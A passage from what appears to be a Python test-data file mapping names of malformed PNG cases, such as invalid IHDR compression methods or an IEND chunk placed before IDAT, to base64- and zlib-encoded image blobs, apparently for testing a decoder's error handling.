2NMbXsbvCW9mwHCYjBQYGhhdx0peyWq8XyHFPVy4FRVTFCWmjmdoeyi9xnhQagzTsL2NrSMzwCk\nAM7jRUrnZQ1Jb4KCm32aFVb7pRX7JYZy1TbvsTTbUYYczxZY2UBxvkL2XxpNc9I4ljNQVRLTkpfN\nikdJxLXOvQVrW7YlZ0NDcsVx6XYLGhofmGe/k4zP0l4tAZP+oL17DpXSSE3n1eRmD2+J9WbpZfTI\n9wfkZWmN+OPOMJ3HMrcETiUeKcoR4mDdUrj/AqoE7BnIObQ5bHwWmqitceoc+u8vvRh4xuiJyXNo\n/Mswx/8/5K61F63chUOLoyeuUyIwyEXcsIVQHfbVvn8AIdszWg==\n'.decode("base64").decode("zlib"),
        'idat_zlib_invalid_window': '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\nkzudiA==\n'.decode("base64").decode("zlib"),
        'iend_before_idat': 'eJztV1tQE1cYzuioVYtWqNKhFSoSO7UItnVKFUMEYyUGhAGZQIVQJLZVO0QkJiEhZCotF21lCBJR\nhFQsWqsSCQINEFLHdCKi8YLchCQqSIKSbAkkm9tmu4SMaXywffDB28PuOTvnfN///f/5zp45RbGb\nN3rM8ZmDQqE88JG4OKSFJp83piFvE3H4DNIsom5IpMZTvqbS0/ZsR+1O25FBDcrYTn1/VdDKUI1h\nBzIDhd+wGVcb8dU+FGrBQjwufAuDpO2N+a2GzpaNLVUU3vAvjP3hxq2fTZT4Q7y4L+tj0/d6VSdJ\nfzl+oeZcygVyHC62ND/IZ4N3g0fXoS2R3nXh3g2faf13jBzibQo5l09eUJ3nf3Qdft1PsUxmafay\nLMBKB4bkpuYWoKDn/jH11Yf63CpzZX2L/SQGrAhhgLb9YE0TEzbMBAqwg9pU1kySYTEFLP4mrVnG\nDSwhFy0jBCRtw/PKdXUBSK+63RPPS+SiT7IC20l9XvNHU++Mz5/oPOw+4pvZYTfPtX4QJGYvsayn\n8DGroQDCqiT/dk+CUEotRvctPUjjvGUBM1aPdV7iBt4kFwUQAts9OzE8cvHnycbMMr+B2ao1zAfV\n7qgD8/bJq7BYBV/ODfxYkY43Fq5WJ+ehk7YhUkcXbOwgSXrCWD3GNU8wJlZpCjiytR9apuN53wpx\nXDSPXDTiSxCe2qOfrX4iRLyl26w9zRmScvBc9NHJ/Kfon14JT3di3IsEVVRwWNcVpnDgYEWrhNEE\nXhYwvZUPtSpTOVg/P1sAnahfiZSaFynElaK5gQhTFIiQuJe4yK2Ik71oBCCdWqXX0GcL1Z3Ctqlz\nzTSgUTVmN61X5gEsnvV6qjVEJ2qC0U2cfq2yQsle5FxmB6vLIQ5Wl0MmWV0OcQhyOeQ19NlBeyEp\nXyfqgYtAZQxDwtFNA/tU7HJrQX/YNYzZrrprBMxowELk//gcan+FobSWWeDALh2M1XmHWffqpoM5\nJS3jbxr/XAyo7dAlyv0qkXbhgH1YkYTgViQ0O6EjCUfcP5OaOQz4dm6/KIe60yGEi27cEqMUq/l9\n9jYr9KkaUNSSMp0jtx41WC+z+/3YsOZi/2AVOGsE2yJZ4i34YlIzonRFl5cxYuJwOqwfPEXATmUm\nLaEJusMfqcRAb1MnprGGaZsXgb1jvsjevf/v0qn0kmuNPlGgbJNQyntYF3pSnxd6byyYIohJdtJ2\ndJHyPqLCGppG1JrVCRWnEQy90SAR2NNAvDfA099jP8jPVlKQ/xNCPnwsq2teV44Bac8GEL47XXXe\nTGI1BBFZHrXV1jxNE/zOMP3qLmSmnhQJ3yLZC8fvc10q3tPZ7xoaS3NltjrHTxDZHXE1zjWpSzgT\nDfbylqc4VU38HvWyf47Sim3FYBnnQa7uAF+tzIb9dvvZ6+mZfPPQ3gGVUjToC68HOBwgynksOOr4\nK3H7Y+MiJhMvdx4SLv85+4g7BFecp43DYMwE135AzHbmE+fZ46AmlT3eHU6pr0O6hezTttkTAGzY\nX9DQCYkcsqkgf/q4yvY2eFNyJxOERWAwX9/G6jlS/kpU4/kOKexnw+nK+JBsFWM6XdFDGzDAQ1A3\nUczy1bdNzAAkAMbrRUrnZQ1Ja4FCW/1a5Vb7xRX7xfoK5Vbf8QzbUboMy+JbWUBJgVz6XxqNczLY\nltNQTQrDkp/DTHSTiGmfexPWtG1NzYGGZfJKyTaLOzQxON9+OxWbrblSCqb8QX33rFtKo3XdV1Jb\nvXzF1htll9xHvj8gK89oxlY6w3Qfy9ocPJV4jDBXgIG1S+G7591KwJqB3ENbIyZmuRN1NE/dQ/89\n04eOpY8dn7yHJr4Ma/z/Q+5ce8HKWTi8OM50jRz1D/0rM74=\n'.decode("base64").decode("zlib"),
        'ihdr_height_0': 'eJztWFtQE1cYjlq1asEKVTpUoSKxU4tgW6dUMUQQKzEgFGQgFUKRWOtlCEhMICFkKpWLtmYIElGU\nVCxeqoIJAg0QUod0IqLxgtyEJCpIgpJsCSRLLpvtEjLS+ND2wQdvD5tzTna/7//+/3xnz5wtiNy0\nwWm2+2wUCuWECw2JQloIuVBvT0V+vt4ytBtppqRHbQhGVcoWDiKDt7YHhQehUHz2HEvSdGQ8KzWU\nkI5COTePX1Ok5LMk5M8FlPVxlGjydxRa0p5tqNSkHSkU35RtlA9X+q4IUOt3oFDz5uNCgjZnEDVd\nEWcraEzp8BJ5/i2v/Mgfb935eYwcfZgb9U11ZPJe13KC5JeTlysuJlwmRYVEFuX6uq93q3FqP7w5\n1I0f5FbzhcZrx+Bh7kb/i7mkeeU5XsfW4tb+FEmnF2UuTQfMNKBfNlbfAOR1Pjyuuv5Yl11mPFHd\nYD2NAUv9M0DLAbCijg7rZwB52D5NImMGUb+IDLK3J9VLOT6FpIKleG/CVhy3RMv3RnrlLS44bhwH\nfZrh00Lsdp07lHhvZO5o2xHHOx5prVbjHPNHviLmYtM6Mg+zCvLGryR4tbjgBRIKG9295BCV9a4J\nTFk13NbM8blNKvDG+7S4tGG4JPaX8Ya0Ys/eWcrV9EfljqiDzvtkZVisnCfj+HwqT8YZ8lep4nPQ\nhK2I1KF5G1qJ4s5ARqdh9TOMcWXqPJZ0zcemaTju94IQDppLKhj0wAvO7NHNUj0TItrUYdScY/VL\nWDgO+th4/hP0/14JF0fikJcJKi9lMW7Kx4KAQ6WN4ow68GoV3U3xWKMcKwGr52ZWQaeqVyCl5oYK\nQorQHB+EKQxESBxLXOBQxPFeOAKQTMzSG+jzhWrPYJtU2UYqUKscto6tU+QADK75ZqLZXyusg9F1\nrB6NolTBXGCfZhvrpENsrJMOGWeddIhN0KRD3kCfH7QLkvC0wk64AFREZIhZ2qlgt5JZYs7rCbyB\nMVqV9w2AEQ2YYnn7X0DtrzGU2jAT7N2lhbFat0DzXu00MKuwYeQdwx+LAJUVaiY/LBNq5vdaB+QE\nBLc8pt4OHYw56jgk1LMy4LvZPcIsyk6bEA66dnOEQqTidVubzNDnKkBeSUyz37nzpMZ8ldnjyYTV\nV3r6ysCZg9gG8WK3qq/GNSNKl7e7GoJHjyTDur4zeOxEZpJCalVH0BOlCOiqa8PUVtAtzsHYe8Yr\nzNQDfxVNpBdfaXAPA6UbBRLuY37AaV1OwINhP3JVRLydtrWdmPMJBVZT1cLG9DaInYTXd4WDscCe\nmtgHvVzdA+aj3EwFGXk/IeQDx9Pbnduz9Eh7wRu/+1zZJSORUeMby3CqLDfnqOvg9wdo13chT+qI\nofAdojV/5CFnUsVCrfW+vrYoW2rh216CyOqIqrDPCT/mfDjYxV2WYFc1+lvYqz4corItbLCY9Shb\ne5CnUmTCnqme1mpaGs/Yv7dXqRD2ecDrABYLCLNvC7Y6/hq77alxEZOJltk3iUn/2fuIO6qu2Xcb\nm8HoMZPrATHb+c/se4+Nmlj8dHXYpb4J6RCyW9NkjQGwgX9C/afEMsiihLxoI0rLe+Bt8b00EBaC\nfjxdE6PzaMlrUY0XO6SghwknK6L9M5UZ02jyTmqvHu6HOmJFDA9d0+h0QAxgXF+mdF7VkNQGKKDR\ns1Fmtl5ZfkCkK1Vs8RhJsRyjSbEMnpkBFObJJP+l0TA7hWk6B1UkZJhys+hxDhIxLXNuw+qmLYlZ\n0IBUdkK81eQIjfPLtd5NxGaqrxWBCb9TPrjgkNIQv+NaYqOrh8h8q7jZ8c4PB6UlKfXYE/YwHcfT\nN/lNJB4hyK7CwJol8P1LDiVgTEfOoY3BozMdiVrrJ86h/3zSnYalDZ8cP4fGvQpz/P9D7lxz2cya\nP7AoauwGKWz8Cwxu/aaQyuBv9/0NDo8/Dg==\n'.decode("base64").decode("zlib"),
        'ihdr_invalid_compression_method': 'eJztV2tQE1cYTXXUqkUrVOnQChWJnVoE2zqliiGCsRKDwoAMUCEUiW3VDhGJSUgImUrLQ60MQSIK\nkopFa1UiQaABQuqYTkQ0PpCXkEQFSVCSLYFkyWOzXULGdP1h+8MfvnZmZ++du+d85/vuuffOLYja\ntN5tltcsDAbjRgwnRCNfaOJ9c8obGIy55EA50llAWxdPi6F+Q2Ok7N6G2ZWyPY0WkLaN9sGKgOXB\nWuN2DGbefCIhdDOTrOuO/K2KwZGPLFbm3/DNj/rxxq2fx6kxh/jRX9VGpe7xqEyQ/XL8QtW5pAuU\naEJUcW6A1zrPOreOQ5vDPWtCPes+1/luHzrE3xB0LpcyrzLH9+ga4poDUSxWceaSDMDKAAYU441N\nQF7X/XLN1YeG7Arzsdom+0kcWBbEBG37wKoGFmycDuTh+3XJ7Olk40IqWPhtSqOc519EKVhC8kvY\nSuSX6mv8kFZlqzuRH8/DnmT7t5J7POYOJ98ZnTvWfhg94p3eZjfPtn4YIOEssqylCnArIT/SigTf\nVneSSEYrxPYsPkjnvm0B01aOtF/i+d+kFPiR/Fvd23F8SuEXiab0Ep++mepVrAeVaNT+OXsVFXi8\nUqDg+X+iTCWa8ldqEnOwCVsRqcPz1reRpV0h7C7TqicY4yu0eVz56o8sU4n870QEHpZPKRjyJolO\n7TbM1DwRIsbSadad5g7IuEQe9uhE/pP0T6+EO5qY8CJBlWVc9nXleChwsKxZymwALwtZnqqHOvV4\nKVg7N1MInahdjpSaHy4iFGN5/ghTBIiQoEtcgCriRGsjApBNztJr6LOF6k/hWzTZZjpQrx6xj69V\n5QBsvvV6sjVIL26AsQ3cXp2qTMVZ4JxmB6vLIQ5Wl0MmWF0OcQhyOeQ19NlBuyGZQC/uggtAVSRT\nytVPAXvUnFJrXm/INZzZrr5rAsxYwBIn+Ok51P4KQ+lNM8C+nXoYr/cMse7RTwWzippG3zL9uRDQ\n2KFL1PsVYt38PvugMgHBLYttdEKHYo+guwmNXCZ8O7tXnEXb4RDCw9ZvjlRJNIIee4sV+kwDKKvJ\n6c6RW4/qrJc5vT4cWHuxt78CnDGEb5Iu8hR+OaEZUbqsw8MUNnY4FTb0nyLhJzOTFdGFnaGP1BKg\nu6EdV1/Fss0Jw98xX+Ts2vd38WR6idUmrwhQvkEk4z+sCT5pyAm+NxJIFUYmOmnbOsg5H9NgLV0r\nbs5ohwpTSMbujWAcsLsu7l4f33CP8yA3U0VF9ieEfLA8o2NOR5YR+Z71I31/uuK8mcyuC4hju1VX\nWnO0DfC7g4yrO5E/DeRw+BbZnj96n+dS8b7eftdYX5wtt9U4NkFkdURXOeekJvbMRrCbvzTJqWrs\n94iXvTtML7QVgiXcB9n6/QKNKhP22eVjr2WkC8wDe/rUKnG/N7wW4HKBCOex4Kjjr3HbHhsXMZlk\nqfOQcPnP2UbcIbziPG0cBmPFutYDYrYznzrPHgc1ueTx6nBKfR0SFbJH12KPBfAhf0EDJ6QKyKaG\nfBmjats74E3pnXQQFoOBAkMLu+tI6StRjec7pKiXA6eqYoIy1cypDGUXvc8ID0CdcRK2t6FlbBog\nBXAeL1I6L2tIehMU3OzTrLDaLy7bJzGUqbZ4j6bZjjLkeLbAygaK8hSy/9JompXGsZyGqpKYltws\nVjxKIq519k1Y27IlOQsalCuOSbda0ND4wFz77WR8pvZKMZj0B+29s6iUhms6ryQ3e3hLrDdKLqFH\nftgvL01rxB9zhuksz9gUOJl4pChbiIN1i+G751ElYE9D7qHNYWMz0ERtjZP30H//6cXAM0aOT9xD\n41+GOf7/IXesvmDlzh9cGD1+jRKBQR7iuk2E6rCv9/4DIdczlQ==\n'.decode("base64").decode("zlib"),
        'ihdr_invalid_filter_method': 'eJztV2tQE1cYTXXUqkUrVOnQChWJnVoE2zqliiGCsRKDwoAMUCEUiG3VDhGJSUgImUrLQ1sZgkQU\nJRWL1qpEgkADhNQhnYhofCAEhCQiSAKSbAkkSx6b7RIypvFH2x/+8LUzO3vv3D3nO993z713bmHU\nts1u87zmoVAoN3w4Lhr5QlPv6zNQr6H6I+QjSGcJZVM8JYb8FYWWsm8nam/KrnRKQPpOyntrAlYH\nawy7UKhFi/G40O10orY78tcqGks6tlxRcMu3IOr7W3d+miTHHOFGf1EblbbfozJB8vOpy1UXky6T\nonFRJXkBXps869w6j2wP96wJ9az7VOu7a/gId0vQxTzSospc3+Mb8Bt+jGIwSrJWZAIWGjAom2xs\nAvLlD06or4/ocypMJ2ubbGcwYHkQHbQeBKsaGLBhNpCPHdAmM2cTDUvJYNHXKY1Sjn8xqXAFwS8h\nFc8t09X4Ia3KNnc8N56DPsP0byP2eCwcTb43vnCi46jriHdGu8003/J+gIi1zLyRzMOshfwIaxJ8\n29wJAgmlCN2z/DCV/aYZTF871tHK8b9NKvQj+Le5d2C4pKLPEo0ZpT59c1XrGA8rXVGHFhyQVWCx\nCp6M4/+RIg1vLFirTsxFJ6QiUkcXbW4niuUhTLlx3ROM8RWafLZ0/QfmmXjuNwIcB80lFQ57EwRn\n9+nnqp8IEWPuMmnPsQclbDwHfXwq/2n6f6+Euysx7nmCKsrZzJuKyVDgcHmzmN4AXuUzPJUjWtVk\nGVi7MIsPna5djZSaGy7AlaA5/ghTBIiQuJa40KWIU62tCEAyPUuvoE8XqjuLbVHnmKhAvWrMNrlR\nmQswuZabyZYgnbABRjewe7XKciVriWOa7axOh9hZnQ6ZYnU6xC7I6ZBX0KcH7YYkPJ1QDheCyki6\nmK2bAfaoWGWW/N6QGxiTTXXfCJjQgDmO98MzqP0lhlKb5oB9e3QwVucZYtmvmwlmFzeNv2H8Yymg\ntkGt5AcVQu3iPtuQIgHBrYptdECHY4+5dhMa2XT4bk6vMJuy2y6Eg67fHqkUqXk9thYL9IkaUFQT\nMxwjdx7VWa6yen1YsOZK70AFOGcY2yRe5sn/fEozonRVp4cxbOJoGqwfOEvATmcmKabyu0IfqURA\nd0MHpr6KYV0Qhr1nusLae/Cvkun0EquNXhGgdItAwh2pCT6jzw3uHwsk8yMTHbTtncTcDymwhqoR\nNmd2QEUpBEP3VjAO2FcX19/H1fezHuZlKcnI/oSQD53I7FzQmW1Avhf8CN+eq7hkIjLrAuKYbtWV\nllxNA/z2EO36HuRPPTEcvkO0FYw/4DhVvKuz3TfUl+RIrTX2TRBZHdFVjjmpiT2/FezmrkxyqJr4\nLeJF745Si6xFYCn7YY7uEE+tzIJ99vrYamkZPNPg/j6VUjjgDW8E2GwgwnEs2Ov4S9zOx8ZFTCZa\n6TgknP5ztBF38K85Thu7wRixzvWAmO38x46zx05NLH28OhxSX4V0CdmjbbHFAtiQP6HB02IZZFVB\nvrRxlfUt8Lb4XgYIC8FAnr6FKT9W9lJU49kOKehlwWnKmKAsFX0mTSGn9hngQagrTsT01rdMzALE\nAMbjeUrnRQ1JbYKCm32aZRbblVUHRfpy5Q7v8XTrcZoUy+RZmEBxvkzyXxqN89JZ5nNQVRLdnJfN\niHeRiGmbfxvWtOxIzoaGpLKT4lSzKzQ+MM92NxmbpblWAib9TnnngktKozVd15KbPbxFllulra4j\n3x2SlqU3Yk86wnSdyNwWOJ14pCCHj4G1y+H7l1xKwJyF3EObwybmuBK1N07fQ//5pxcNSxs7NXUP\njX8R5vj/h9y9/rKFvXhoafTkDVIECnnwm7bhqsO+PPA36vQzzQ==\n'.decode("base64").decode("zlib"),
